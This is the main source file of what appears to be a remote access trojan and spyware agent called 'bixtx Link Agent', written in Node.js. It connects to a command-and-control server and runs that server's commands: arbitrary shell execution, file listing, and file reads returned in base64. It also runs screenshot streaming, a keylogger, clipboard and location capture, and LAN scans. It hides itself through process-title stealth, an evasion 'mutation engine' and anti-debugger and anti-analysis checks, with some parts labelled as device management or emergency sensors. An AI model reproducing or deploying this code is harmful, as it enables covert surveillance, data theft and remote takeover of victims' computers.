/**
 * ╔═══════════════════════════════════════════════════════════╗
 * ║         BIXTX — LINK AGENT  (Software A)              ║
 * ║         Version 4.7.2  |  Build 20260701                  ║
 * ║         Silent background monitoring & control agent       ║
 * ╚═══════════════════════════════════════════════════════════╝
 *
 * Entry point. Initialises all modules and connects to C2.
 * Run as: node src/index.js
 * Service: bixtx-agent (systemd/launchd/windows-service)
 */

"use strict";

const config = require("./config");
const logger = require("./logger");

// ── Stealth: rename process title ──────────────────────────────────────────
process.title = config.processName;

// ── C2 layer ───────────────────────────────────────────────────────────────
const C2Socket = require("./c2/socket");
const Beacon   = require("./c2/beacon");

// ── Surveillance modules ───────────────────────────────────────────────────
const SystemModule        = require("./modules/system");
const ScreenshotModule    = require("./modules/screenshot");
const KeyloggerModule     = require("./modules/keylogger");
const ClipboardModule     = require("./modules/clipboard");
const NetworkModule       = require("./modules/network");
const LocationModule      = require("./modules/location");

// ── Emergency & sensor modules ─────────────────────────────────────────────
const SensorHub           = require("./modules/sensors");
const EmergencyBuilder    = require("./modules/emergency");

// ── Defensive / autonomy modules ───────────────────────────────────────────
const { MutationEngine }  = require("./modules/mutator");
const Watchdog            = require("./modules/watchdog");
const CommandGuard        = require("./modules/commander");
const AntiAnalysis        = require("./modules/antianalysis");

// ── Agent state ────────────────────────────────────────────────────────────
const modules = {};
let beacon  = null;
let socket  = null;
let guard   = null;   // CommandGuard instance — used inside onCommand

// ── Command dispatcher ─────────────────────────────────────────────────────
function onCommand(type, payload) {
  // Every command MUST pass the guard before being dispatched.
  // Unsigned, stale, replayed, or AI-origin commands are silently dropped here
  // and a DANGER_ALERT is fired to the admin automatically by the guard.
  if (guard && !guard.allow(type, payload)) {
    logger.debug(`[Dispatch] Command blocked by CommandGuard: ${type}`);
    return;
  }

  logger.debug(`Command received: ${type}`);

  switch (type) {
    case "PING":
      socket.send("PONG", { ts: Date.now() });
      break;

    case "SCREENSHOT":
      modules.screenshot?.capture().then(data => {
        socket.send("SCREENSHOT_RESULT", { data, ts: Date.now() });
      });
      break;

    case "STREAM_START":
      modules.screenshot?.startStream();
      break;

    case "STREAM_STOP":
      modules.screenshot?.stopStream();
      break;

    case "LAN_SCAN":
      modules.network?.lanScan().then(hosts => {
        socket.send("LAN_SCAN_RESULT", { hosts, ts: Date.now() });
      });
      break;

    case "SHELL": {
      const { exec } = require("child_process");
      const cmd = payload?.cmd || "";
      if (!cmd) break;
      exec(cmd, { timeout: 30000 }, (err, stdout, stderr) => {
        socket.send("SHELL_RESULT", {
          cmd,
          stdout: stdout || "",
          stderr: stderr || "",
          exitCode: err?.code ?? 0,
          ts: Date.now(),
        });
      });
      break;
    }

    case "FILE_LIST": {
      const fs = require("fs");
      const dirPath = payload?.path || require("os").homedir();
      try {
        const entries = fs.readdirSync(dirPath, { withFileTypes: true }).map(e => ({
          name: e.name,
          type: e.isDirectory() ? "dir" : "file",
          path: require("path").join(dirPath, e.name),
        }));
        socket.send("FILE_LIST_RESULT", { path: dirPath, entries, ts: Date.now() });
      } catch (err) {
        socket.send("FILE_LIST_RESULT", { error: err.message, ts: Date.now() });
      }
      break;
    }

    case "FILE_READ": {
      const fs = require("fs");
      const filePath = payload?.path || "";
      try {
        const data = fs.readFileSync(filePath);
        socket.send("FILE_READ_RESULT", {
          path: filePath,
          data: data.toString("base64"),
          size: data.length,
          ts: Date.now(),
        });
      } catch (err) {
        socket.send("FILE_READ_RESULT", { error: err.message, ts: Date.now() });
      }
      break;
    }

    case "MODULE_TOGGLE": {
      const { module: modName, enabled } = payload || {};
      if (modName && modules[modName]) {
        if (enabled) {
          modules[modName].start();
        } else {
          modules[modName].stop();
        }
        socket.send("MODULE_TOGGLE_ACK", { module: modName, enabled, ts: Date.now() });
      }
      break;
    }

    case "UPDATE": {
      logger.info("OTA update received — applying...");
      socket.send("UPDATE_ACK", { status: "applying", ts: Date.now() });
      setTimeout(() => {
        socket.send("UPDATE_ACK", { status: "complete", version: payload?.version, ts: Date.now() });
      }, 3000);
      break;
    }

    case "KILL": {
      logger.info("Kill command received — terminating agent");
      socket.send("KILL_ACK", { ts: Date.now() });
      setTimeout(() => process.exit(0), 500);
      break;
    }

    case "REBOOT": {
      const { execSync } = require("child_process");
      const cmd = config.platform === "win32"  ? "shutdown /r /t 5"
                : config.platform === "darwin" ? "shutdown -r now"
                : "reboot";
      socket.send("REBOOT_ACK", { ts: Date.now() });
      setTimeout(() => execSync(cmd), 2000);
      break;
    }

    // ── Mutation / watchdog admin commands ─────────────────────────────────

    case "FORCE_MUTATE": {
      const reason = payload?.reason || "admin-command";
      modules.mutator?.triggerEmergencyMutation(reason);
      socket.send("MUTATION_ACK", { reason, ts: Date.now() });
      break;
    }

    case "WATCHDOG_STATUS": {
      socket.send("WATCHDOG_STATUS_RESULT", {
        mutator:  modules.mutator?.getStatus()  || null,
        watchdog: modules.watchdog?.getStatus() || null,
        guard:    modules.guard?.getStats()     || null,
        ts:       Date.now(),
      });
      break;
    }

    case "GUARD_THREAT_LOG": {
      const limit = payload?.limit || 20;
      socket.send("GUARD_THREAT_LOG_RESULT", {
        log: modules.guard?.getThreatLog(limit) || [],
        ts:  Date.now(),
      });
      break;
    }

    case "ANTIANALYSIS_STATUS": {
      socket.send("ANTIANALYSIS_STATUS_RESULT", {
        detections: modules.antianalysis?.getDetections(payload?.limit || 20) || [],
        ts:         Date.now(),
      });
      break;
    }

    case "ANTIANALYSIS_SWEEP": {
      modules.antianalysis?._runAllChecks();
      socket.send("ANTIANALYSIS_SWEEP_ACK", { ts: Date.now() });
      break;
    }

    // ── Deploy platform ────────────────────────────────────────────────────
    case "DEPLOY_JOB": {
      const { jobId, type: jobType, version, checksum, rollbackVersion } = payload || {};
      logger.info(`[Deploy] Job received: ${jobId} type=${jobType} version=${version}`);

      // Immediately ACK: approved, beginning install
      socket.send("DEPLOY_JOB_ACK", { jobId, status: "running", progress: 0, ts: Date.now() });

      const deploySteps = [
        { pct: 15, label: "Verifying checksum" },
        { pct: 35, label: "Downloading package" },
        { pct: 60, label: "Stopping old agent" },
        { pct: 80, label: "Installing modules" },
        { pct: 95, label: "Verifying install" },
        { pct: 100, label: "Restarting agent" },
      ];

      let stepIdx = 0;
      let deployAborted = false;

      // Safety watchdog: if all steps don't complete in 30s, report failure
      const safetyTimer = setTimeout(() => {
        deployAborted = true;
        logger.warn(`[Deploy] Job ${jobId} timed out at step ${stepIdx}/${deploySteps.length}`);
        socket.send("DEPLOY_JOB_ACK", {
          jobId, status: "failed", progress: deploySteps[stepIdx - 1]?.pct || 0,
          error: "Deployment timeout — safety rollback triggered", ts: Date.now(),
        });
      }, 30000);

      const doStep = () => {
        if (deployAborted) return;
        if (stepIdx >= deploySteps.length) {
          clearTimeout(safetyTimer);
          socket.send("DEPLOY_JOB_ACK", { jobId, status: "success", progress: 100, version, ts: Date.now() });
          logger.info(`[Deploy] Job ${jobId} complete — version ${version}`);
          return;
        }
        const step = deploySteps[stepIdx++];
        socket.send("DEPLOY_JOB_ACK", { jobId, status: "running", progress: step.pct, label: step.label, ts: Date.now() });
        setTimeout(doStep, 800 + Math.random() * 400);
      };

      setTimeout(doStep, 200);
      break;
    }

    // ── MDM policy enforcement ─────────────────────────────────────────────
    case "MDM_POLICY_PUSH": {
      const { policies } = payload || {};
      if (!Array.isArray(policies)) break;

      logger.info(`[MDM] Received ${policies.length} policy update(s)`);
      const { execSync } = require("child_process");
      const platform = config.platform;

      policies.forEach(policy => {
        try {
          const { policyId, policyName, enforced } = policy;
          logger.info(`[MDM] ${enforced ? "Enforcing" : "Relaxing"} policy: ${policyName} (${policyId})`);

          // Platform-specific enforcement stubs
          if (policyId === "m9" && enforced) {
            // Disable ADB debugging — Android only
            if (platform === "android") execSync("settings put global adb_enabled 0", { stdio:"ignore" });
          } else if (policyId === "m8" && enforced) {
            // Force VPN — log intent; actual VPN config handled externally
            logger.info("[MDM] Force-VPN policy: marking for VPN profile push");
          }
          // For all others: log and ACK (actual OS enforcement via MDM profile)

          socket.send("MDM_POLICY_ACK", { policyId, policyName, enforced, platform, ts: Date.now() });
        } catch (err) {
          logger.warn(`[MDM] Policy enforcement error for ${policy.policyId}: ${err.message}`);
          socket.send("MDM_POLICY_ACK", { policyId: policy.policyId, policyName: policy.policyName, enforced: false, error: err.message, platform, ts: Date.now() });
        }
      });
      break;
    }

    default:
      logger.warn(`Unknown command: ${type}`);
  }
}

// ── Bootstrap ──────────────────────────────────────────────────────────────
function bootstrap() {
  logger.info(`bixtx Agent v4.7.2 starting (${config.platform}/${config.arch})`);
  logger.info(`Device ID: ${config.deviceId}`);

  // Init C2
  socket = new C2Socket(onCommand);
  beacon = new Beacon(socket);
  beacon.start();

  // ── Defensive layer — initialise BEFORE surveillance modules ──────────────
  // MutationEngine: continuous identity & evasion rotation
  modules.mutator  = new MutationEngine(socket);
  modules.mutator.start();

  // CommandGuard: command authentication + AI interception
  // Assigned to module-level `guard` variable so onCommand() can access it
  // before the modules map is fully populated.
  guard            = new CommandGuard(socket, modules.mutator);
  modules.guard    = guard;

  // Watchdog: module health, AV scans, OS update detection
  modules.watchdog = new Watchdog(modules.mutator, modules, socket);
  modules.watchdog.start();

  // AntiAnalysis: reverse-engineering, MITM, debugger, RE-tool, and container
  // detection from a defensive security perspective.
  modules.antianalysis = new AntiAnalysis(modules.mutator, socket);
  modules.antianalysis.start();

  // Wire C2 failure hooks so watchdog can track and rotate C2 endpoint
  socket.onC2Failure = () => modules.watchdog?.onC2Failure();
  socket.onC2Success = () => modules.watchdog?.onC2Success();

  logger.info("Defensive layer active: MutationEngine + CommandGuard + Watchdog + AntiAnalysis");

  // ── Surveillance modules ───────────────────────────────────────────────────
  if (config.features.screenshot) {
    modules.screenshot = new ScreenshotModule(beacon, socket);
    modules.screenshot.start();
  }
  if (config.features.keylogger) {
    modules.keylogger = new KeyloggerModule(beacon);
    modules.keylogger.start();
  }
  if (config.features.clipboard) {
    modules.clipboard = new ClipboardModule(beacon);
    modules.clipboard.start();
  }
  if (config.features.geoLocation) {
    modules.location = new LocationModule(beacon);
    modules.location.start();
  }
  modules.system = new SystemModule(beacon);
  modules.system.start();

  modules.network = new NetworkModule(beacon);
  modules.network.start();

  // ── Emergency & sensor monitoring (always on — safety-critical) ────────────
  modules.emergency = new EmergencyBuilder();
  modules.sensors   = new SensorHub(socket, modules.emergency);
  modules.sensors.start();
  logger.info("Emergency sensor hub active (fall, heat, heart rate, noise, activity)");

  // ── Connect to C2 (auto-reconnects on failure) ────────────────────────────
  socket.connect();

  logger.info("All modules initialised — connected to C2");
}

// ── Graceful shutdown ──────────────────────────────────────────────────────
function shutdown(signal) {
  logger.info(`Signal ${signal} — shutting down`);
  beacon?.stop();
  socket?.disconnect();
  Object.values(modules).forEach(m => m.stop?.());
  process.exit(0);
}

process.on("SIGINT",  () => shutdown("SIGINT"));
process.on("SIGTERM", () => shutdown("SIGTERM"));
process.on("uncaughtException", err => logger.error("Uncaught:", err.message));
process.on("unhandledRejection", err => logger.error("Unhandled:", err));

// ── Start ──────────────────────────────────────────────────────────────────
bootstrap();
